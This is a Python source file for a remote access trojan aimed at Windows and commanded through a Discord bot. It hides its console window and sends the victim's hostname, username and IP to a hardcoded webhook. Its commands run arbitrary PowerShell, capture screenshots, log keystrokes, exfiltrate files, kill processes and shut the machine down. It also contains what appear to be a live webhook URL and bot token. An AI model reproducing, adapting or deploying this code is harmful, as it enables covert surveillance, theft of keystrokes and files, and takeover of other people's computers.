import sys
import os

# WINDOWS 11 SILENT MODE - MUST BE FIRST
if sys.platform == "win32":
    import ctypes
    
    # HIDE CONSOLE WINDOW COMPLETELY
    kernel32 = ctypes.WinDLL('kernel32')
    user32 = ctypes.WinDLL('user32')
    
    hWnd = kernel32.GetConsoleWindow()
    if hWnd:
        user32.ShowWindow(hWnd, 0)  # SW_HIDE
    
    # PREVENT ERROR DIALOGS
    SEM_NOGPFAULTERRORBOX = 0x0002
    kernel32.SetErrorMode(SEM_NOGPFAULTERRORBOX)

import discord
from discord.ext import commands
import asyncio
import aiohttp
import platform
import socket
import psutil
import getpass
import json
from datetime import datetime
import subprocess as sp
from io import BytesIO

# ============ YOUR CONFIGURATION ============
# CHANGE THESE TO YOUR SETTINGS BEFORE UPLOADING
WEBHOOK_URL = "https://discord.com/api/webhooks/1470703282484809852/8qx9drC1-bW1oE6xyC4XTmWqSOXE-tRvYogoqChS5tt8e7wq69vUz96ESKpJfxC5z_Gk"
CONTROL_CHANNEL_ID = 1466788178915627283  # YOUR PRIVATE CHANNEL ID
RAT_BOT_TOKEN = "MTQ2OTY4OTg1OTMyMzk5MDEyOA.GmXj3s._3h7OgfUqCjSOIaw-UT0B1xwIQcZ1ZcWo-qFns"
# ===========================================

intents = discord.Intents.default()
intents.message_content = True

bot = commands.Bot(command_prefix='!', intents=intents)

# KEYLOGGER
keylog_buffer = []
keylogger_active = False

try:
    from pynput import keyboard
    
    def on_key_press(key):
        global keylog_buffer
        try:
            keylog_buffer.append(str(key.char))
        except AttributeError:
            keylog_buffer.append(f'[{key}]')
            
    KEYLOGGER_AVAILABLE = True
except:
    KEYLOGGER_AVAILABLE = False

try:
    import pyautogui
    SCREENSHOT_AVAILABLE = True
except:
    SCREENSHOT_AVAILABLE = False

async def send_initial_info():
    """SEND CONNECTION INFO TO WEBHOOK"""
    try:
        system_info = {
            "timestamp": datetime.now().isoformat(),
            "hostname": socket.gethostname(),
            "username": getpass.getuser(),
            "platform": f"{platform.system()} {platform.release()}",
            "version": platform.version(),
            "ip": socket.gethostbyname(socket.gethostname()),
            "cpu": f"{psutil.cpu_percent()}%",
            "memory": f"{psutil.virtual_memory().percent}%",
        }

        async with aiohttp.ClientSession() as session:
            payload = {
                "content": f"**🟢 NEW RAT CONNECTION**\n```json\n{json.dumps(system_info, indent=2)}\n```"
            }
            await session.post(WEBHOOK_URL, json=payload)
            
    except:
        pass

@bot.event
async def on_ready():
    await send_initial_info()
    
    if CONTROL_CHANNEL_ID:
        try:
            channel = bot.get_channel(CONTROL_CHANNEL_ID)
            if channel:
                await channel.send(f"✅ **RAT Online**\n`{socket.gethostname()}` | `{getpass.getuser()}`")
        except:
            pass

@bot.command(name='screenshot')
async def screenshot(ctx):
    """TAKE SCREENSHOT"""
    if ctx.channel.id != CONTROL_CHANNEL_ID:
        return
        
    if not SCREENSHOT_AVAILABLE:
        await ctx.send("❌ Screenshot not available")
        return
        
    try:
        screenshot = pyautogui.screenshot()
        img_bytes = BytesIO()
        screenshot.save(img_bytes, format='PNG')
        img_bytes.seek(0)
        
        file = discord.File(img_bytes, filename=f"ss_{datetime.now().strftime('%H%M%S')}.png")
        await ctx.send(file=file)
    except Exception as e:
        await ctx.send(f"❌ Error: {str(e)}")

@bot.command(name='exec')
async def execute(ctx, *, command: str):
    """EXECUTE SHELL COMMAND (POWERSHELL FOR WINDOWS 11)"""
    if ctx.channel.id != CONTROL_CHANNEL_ID:
        return
        
    try:
        CREATE_NO_WINDOW = 0x08000000
        
        result = sp.run(
            ["powershell", "-Command", command],
            capture_output=True,
            text=True,
            timeout=30,
            creationflags=CREATE_NO_WINDOW
        )
        
        output = result.stdout if result.stdout else result.stderr
        if not output:
            output = "✅ Executed (no output)"
            
        if len(output) > 1900:
            chunks = [output[i:i+1900] for i in range(0, len(output), 1900)]
            for chunk in chunks:
                await ctx.send(f"```\n{chunk}\n```")
        else:
            await ctx.send(f"```\n{output}\n```")
            
    except Exception as e:
        await ctx.send(f"❌ Error: {str(e)}")

@bot.command(name='keylog')
async def keylog_start(ctx):
    """START KEYLOGGER"""
    if ctx.channel.id != CONTROL_CHANNEL_ID:
        return
        
    if not KEYLOGGER_AVAILABLE:
        await ctx.send("❌ Keylogger not available")
        return
        
    global keylogger_active
    keylogger_active = True
    listener = keyboard.Listener(on_press=on_key_press)
    listener.start()
    await ctx.send("✅ Keylogger started")

@bot.command(name='dump')
async def keylog_dump(ctx):
    """DUMP KEYLOG"""
    if ctx.channel.id != CONTROL_CHANNEL_ID:
        return
        
    global keylog_buffer
    if not keylog_buffer:
        await ctx.send("📝 No keylogs")
        return
        
    keylogs = ''.join(keylog_buffer)
    
    if len(keylogs) > 1900:
        chunks = [keylogs[i:i+1900] for i in range(0, len(keylogs), 1900)]
        for chunk in chunks:
            await ctx.send(f"```\n{chunk}\n```")
    else:
        await ctx.send(f"```\n{keylogs}\n```")
        
    keylog_buffer.clear()

@bot.command(name='download')
async def download(ctx, *, filepath: str):
    """DOWNLOAD FILE"""
    if ctx.channel.id != CONTROL_CHANNEL_ID:
        return
        
    try:
        if not os.path.exists(filepath):
            await ctx.send("❌ File not found")
            return
            
        file_size = os.path.getsize(filepath)
        if file_size > 8_000_000:
            await ctx.send("❌ File too large (>8MB)")
            return
            
        file = discord.File(filepath)
        await ctx.send(file=file)
    except Exception as e:
        await ctx.send(f"❌ Error: {str(e)}")

@bot.command(name='ls')
async def listdir(ctx, *, path: str = "."):
    """LIST DIRECTORY"""
    if ctx.channel.id != CONTROL_CHANNEL_ID:
        return
        
    try:
        files = os.listdir(path)
        output = "\n".join(files[:50])
        await ctx.send(f"```\n{output}\n```")
    except Exception as e:
        await ctx.send(f"❌ Error: {str(e)}")

@bot.command(name='ps')
async def processes(ctx):
    """LIST PROCESSES"""
    if ctx.channel.id != CONTROL_CHANNEL_ID:
        return
        
    try:
        process_list = []
        for proc in psutil.process_iter(['pid', 'name']):
            try:
                process_list.append(f"{proc.info['pid']} - {proc.info['name']}")
            except:
                pass
                
        output = "\n".join(process_list[:40])
        await ctx.send(f"```\n{output}\n```")
    except Exception as e:
        await ctx.send(f"❌ Error: {str(e)}")

@bot.command(name='kill')
async def kill_process(ctx, pid: int):
    """KILL PROCESS"""
    if ctx.channel.id != CONTROL_CHANNEL_ID:
        return
        
    try:
        process = psutil.Process(pid)
        process.terminate()
        await ctx.send(f"✅ Killed PID {pid}")
    except Exception as e:
        await ctx.send(f"❌ Error: {str(e)}")

@bot.command(name='info')
async def sysinfo(ctx):
    """SYSTEM INFO"""
    if ctx.channel.id != CONTROL_CHANNEL_ID:
        return
        
    try:
        info = f"""```
OS: {platform.system()} {platform.release()}
Version: {platform.version()}
Host: {socket.gethostname()}
User: {getpass.getuser()}
IP: {socket.gethostbyname(socket.gethostname())}
CPU: {psutil.cpu_percent()}%
RAM: {psutil.virtual_memory().percent}%
Disk: {psutil.disk_usage('C:\\').percent}%
```"""
        await ctx.send(info)
    except Exception as e:
        await ctx.send(f"❌ Error: {str(e)}")

@bot.command(name='shutdown')
async def shutdown_system(ctx):
    """SHUTDOWN"""
    if ctx.channel.id != CONTROL_CHANNEL_ID:
        return
        
    await ctx.send("🔴 Shutting down...")
    os.system("shutdown /s /t 1")

@bot.command(name='restart')
async def restart_system(ctx):
    """RESTART"""
    if ctx.channel.id != CONTROL_CHANNEL_ID:
        return
        
    await ctx.send("🔄 Restarting...")
    os.system("shutdown /r /t 1")

@bot.command(name='cd')
async def change_directory(ctx, *, path: str):
    """CHANGE WORKING DIRECTORY"""
    if ctx.channel.id != CONTROL_CHANNEL_ID:
        return
        
    try:
        os.chdir(path)
        await ctx.send(f"✅ Changed to: `{os.getcwd()}`")
    except Exception as e:
        await ctx.send(f"❌ Error: {str(e)}")

@bot.command(name='pwd')
async def print_working_directory(ctx):
    """SHOW CURRENT DIRECTORY"""
    if ctx.channel.id != CONTROL_CHANNEL_ID:
        return
        
    await ctx.send(f"📁 `{os.getcwd()}`")

# RUN WITH HARDCODED TOKEN (NO LOGGING)
bot.run(RAT_BOT_TOKEN, log_handler=None)
